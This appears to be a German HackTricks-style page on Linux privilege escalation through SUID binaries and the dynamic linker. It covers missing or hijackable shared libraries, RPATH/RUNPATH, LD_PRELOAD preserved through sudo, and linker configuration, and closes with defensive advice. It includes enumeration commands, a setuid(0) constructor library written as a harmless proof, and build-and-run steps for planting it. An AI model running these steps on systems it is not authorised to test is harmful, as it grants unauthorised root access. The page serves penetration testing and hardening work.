# SUID Shared Library und Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID-Binaries werden üblicherweise auf direkte command execution überprüft, aber benutzerdefinierte SUID-Programme können auch über den dynamic linker verwundbar sein. Das gemeinsame Muster ist einfach: Ein privilegiertes Executable lädt Code aus einem Pfad oder einer Konfiguration, die ein Benutzer mit geringeren Rechten beeinflussen kann.<sup>[[1]](#references)</sup>

Diese Seite konzentriert sich auf allgemeine Technikmuster: fehlende Libraries, beschreibbare Library-Verzeichnisse, `RPATH`/`RUNPATH`, `LD_PRELOAD` über sudo, Linker-Konfiguration und SUID-hardlink confusion.

## Schnelle Enumeration

Beginne damit, ungewöhnliche SUID-Dateien zu finden und zu überprüfen, ob sie dynamisch gelinkt sind:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Konzentriere dich auf nicht standardmäßige Speicherorte, benutzerdefinierte Anwendungspfade, root gehörende Binaries außerhalb von paketverwalteten Verzeichnissen und aus beschreibbaren Verzeichnissen geladene Abhängigkeiten.<sup>[[1]](#references)</sup>

Nützliche Prüfungen der Schreibrechte:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Einige benutzerdefinierte SUID-Binärdateien versuchen, ein nicht vorhandenes Shared Object zu laden. Wenn sich der fehlende Pfad unter einem vom Angreifer kontrollierten Verzeichnis befindet, kann die Binärdatei vom Angreifer bereitgestellten Code als effektiver Benutzer laden.<sup>[[1]](#references)</sup>

Fehlgeschlagene Library-Lookups mit dem Syscall-Filter von `strace` finden:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Wenn die Binärdatei einen beschreibbaren Pfad nach `libexample.so` durchsucht, kann eine minimale Proof-Library einen Constructor verwenden. Halte den Proof-of-Impact während der Validierung harmlos:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Erstelle sie mit dem exakten Dateinamen, den die Binärdatei zu laden versucht:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die ausnutzbare Bedingung ist nicht allein die fehlende Bibliothek. Der Angreifer muss ein kompatibles Shared Object an einem Pfad platzieren können, den der privilegierte Loader akzeptiert.<sup>[[1]](#references)</sup>

## Beschreibbares Bibliotheksverzeichnis

Manchmal sind alle Abhängigkeiten vorhanden, aber eines der für ihre Auflösung verwendeten Verzeichnisse ist beschreibbar. Dies kann das Ersetzen einer geladenen Bibliothek oder das Platzieren einer Bibliothek mit höherer Priorität und demselben Namen ermöglichen.<sup>[[1]](#references)</sup>

Überprüfe die Abhängigkeitspfade:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Wenn das Verzeichnis beschreibbar ist, validiere dies in einer Laborumgebung mit einem kopiersicheren Ansatz. Das Ersetzen von Systembibliotheken auf einem Live-Host kann dazu führen, dass gleichzeitig gestartete Prozesse Bibliotheksversionen inkonsistent verwenden.<sup>[[8]](#references)</sup>

## RPATH und RUNPATH

`RPATH` und `RUNPATH` sind Einträge im dynamischen Abschnitt, die dem Loader mitteilen, wo nach Bibliotheken gesucht werden soll. Sie sind in SUID-Programmen gefährlich, wenn sie auf für Angreifer beschreibbare Verzeichnisse verweisen.<sup>[[1]](#references)</sup>

Erkenne sie:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Beispiel für eine riskante Ausgabe:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Wenn `/opt/app/lib` beschreibbar ist und die Binary `libcustom.so` benötigt, kann der Angreifer möglicherweise dort eine bösartige `libcustom.so` platzieren:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` und `RUNPATH` sind hinsichtlich aller Auflösungsdetails nicht identisch, aber bei der Prüfung auf Privilege Escalation ist die praktische Frage dieselbe: Durchsucht das SUID-Binary ein vom Angreifer beschreibbares Verzeichnis nach einem Library-Namen?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH und SUID

Bei normalen Programmen können `LD_PRELOAD` und `LD_LIBRARY_PATH` das Laden von Shared Objects erzwingen oder beeinflussen. Bei SUID-Programmen wechselt der dynamische Loader normalerweise in den Secure-Execution-Modus und ignoriert gefährliche Umgebungsvariablen.<sup>[[1]](#references)</sup>

Das bedeutet, dass ein einfaches SUID-Binary normalerweise nicht allein deshalb verwundbar ist, weil der Benutzer `LD_PRELOAD` setzen kann:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die häufige Ausnahme ist eine sudo-Richtlinie, die das Setzen oder Beibehalten von Loader-Variablen für den Zielbefehl erlaubt. Prüfe `sudo -l` auf Einträge wie `env_keep+=LD_PRELOAD` oder `env_keep+=LD_LIBRARY_PATH`; wenn das Ziel dynamisch gelinkt ist, lädt es möglicherweise von Angreifern kontrollierten Code:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Verwechsle diese Fälle nicht; die oben genannten Loader- und sudo-Richtlinien unterscheiden sie:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` gegen eine normale SUID-Binärdatei: normalerweise durch Secure Execution blockiert.
- Durch sudo beibehaltenes `LD_PRELOAD`: potenziell ausnutzbar.
- Fehlende `.so` in einem beschreibbaren Pfad: ausnutzbar, wenn die SUID-Binärdatei diesen Pfad auf natürliche Weise lädt.
- `RPATH`/`RUNPATH` zu einem beschreibbaren Verzeichnis: ausnutzbar, wenn eine benötigte Library kontrolliert werden kann.
- Schreibzugriff auf `/etc/ld.so.preload` oder die Linker-Konfiguration: systemweit und mit hoher Auswirkung.

## Linker-Konfiguration

`ld.so` verwendet den Linker-Cache und `/etc/ld.so.preload`; `ldconfig` erstellt diesen Cache aus `/etc/ld.so.conf` und den daraus eingebundenen Dateien, üblicherweise aus `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Wichtige Prüfungen:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Eine beschreibbare Linker-Konfiguration ist normalerweise schwerwiegender als eine einzelne verwundbare SUID-Binärdatei, da sie viele dynamisch gelinkte Prozesse beeinflussen kann. `/etc/ld.so.preload` ist besonders gefährlich, da damit ein shared object in privilegierte Prozesse gezwungen werden kann.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks können dafür sorgen, dass derselbe SUID-Inode unter mehreren Namen erscheint.<sup>[[9]](#references)</sup> Dies ist nützlich, um einen privilegierten Helfer zu verstecken, die Bereinigung zu erschweren oder eine naive pfadbasierte Überprüfung zu umgehen.

SUID-Dateien mit mehr als einem Link finden:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Überprüfe alle Pfade zur selben Inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Der Missbrauch besteht nicht darin, dass ein hardlink Berechtigungen ändert. Der Missbrauch ist die Pfadverwechslung: Ein privilegierter inode kann über einen Namen erreichbar sein, den Verteidiger oder Scripts nicht erwarten.<sup>[[9]](#references)</sup> Weitere Informationen zum inode- und hardlink-Workflow finden Sie unter [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Hinweise

- Halten Sie SUID-Binaries minimal, auditiert und nach Möglichkeit paketverwaltet.
- Vermeiden Sie `RPATH`-/`RUNPATH`-Einträge, die auf beschreibbare oder von Anwendungen verwaltete Verzeichnisse zeigen.<sup>[[1]](#references)[[8]](#references)</sup>
- Halten Sie Library-Verzeichnisse im Besitz von root und für reguläre Benutzer nicht beschreibbar.<sup>[[8]](#references)</sup>
- Bewahren Sie `LD_PRELOAD`, `LD_LIBRARY_PATH` oder ähnliche Loader-Variablen nicht über sudo hinweg auf.<sup>[[1]](#references)[[5]](#references)</sup>
- Überwachen Sie `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` und unerwartete SUID-Dateien.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Überprüfen Sie hardgelinkte SUID-Dateien und untersuchen Sie benutzerdefinierte SUID-Wrapper außerhalb standardmäßiger Systempfade.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux-Handbuchseite](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Allgemeine Attribute (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Absicherung des Dynamic Linkers (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hardlinks (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
